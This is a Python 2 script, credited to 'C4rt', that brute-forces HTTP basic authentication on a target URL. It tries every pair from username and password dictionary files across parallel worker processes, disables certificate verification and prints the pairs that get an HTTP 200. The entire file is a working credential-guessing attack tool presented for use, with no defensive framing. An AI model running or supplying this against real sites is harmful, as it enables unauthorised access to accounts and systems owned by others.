#!/usr/bin/env python
# -*- coding: utf-8 -*

'''
Small Multiprocessing python script to brute force web basic authentication
...
'''

__author__ = "C4rt"
__date__ = "18/07/2013"
__version__ = "1.0"
__maintainer__ = "C4rt"
__email__ = "eric.c4rtman@gmail.com"
__status__ = "Production"

try:
    import requests
    import multiprocessing
    import Queue
    import optparse
    import traceback
except ImportError, err:
    raise
    print >>sys.stderr, "[X] Unable to import : %s\n" % err
    sys.exit(1)


def enumattempt(url, credqueue, validqueue):
  print '[*] Starting new enum thread.'
  while True:
    try:
      creds = credqueue.get(timeout=10)
    except Queue.Empty:
      print '[-] Credential queue is empty, quitting.'
      return
    # If there are good creds in the queue, stop the thread
    if not validqueue.empty():
        print '[-] Success queue has credentials, quitting.'
        return
    try:
        resp = requests.get(url, auth=(creds[0], creds[1]), verify=False)
        if resp.status_code == 200:
            print '[+] Success: {0} : {1}'.format(creds[0], creds[1])
            validqueue.put(creds)
            return
        else:
            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
    except:
        print "\n\n\n\n", traceback.format_exc()

def main():
    parser = optparse.OptionParser(
        "Usage: bruteAuthWeb.py -H <url> -u <user names file> -d <Password names file>")
    parser.add_option('-H', dest='tgtUrl', type='string',
                          help='specify target Url')
    parser.add_option('-u', dest='userfile', type='string',
                          help='specify dictionnary with login usernames')
    parser.add_option('-d', dest='passfile', type='string',
                          help='specify dictionnary with passwords')
    (options, args) = parser.parse_args()

    url = options.tgtUrl
    userfile = options.userfile
    passfile = options.passfile

    if url == None or userfile == None or passfile == None:
        print parser.usage
        exit(0)
    #
    credqueue = multiprocessing.Queue()
    validqueue = multiprocessing.Queue()
    procs = []
    usernames = open(userfile).read().splitlines()
    passnames = open(passfile).read().splitlines()
    print "\nStarting enumeration\n======================"
    for c in range(multiprocessing.cpu_count()):
      p = multiprocessing.Process(target=enumattempt, args=(url, credqueue, validqueue))
      procs.append(p)
      p.start()

    for user in usernames:
        for pwd in passnames:
          credqueue.put((user, pwd))

    for p in procs:
      p.join()

    while not validqueue.empty():
      print "\n\nThe following credentials pairs were valid:\n"
      user, pwd = validqueue.get()
      print "User : {0} / Pass: {1}".format(user, pwd)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n\n[%] Process interrupted by user..", "r", "error"
    except:
        print "\n\n\n\n", traceback.format_exc()
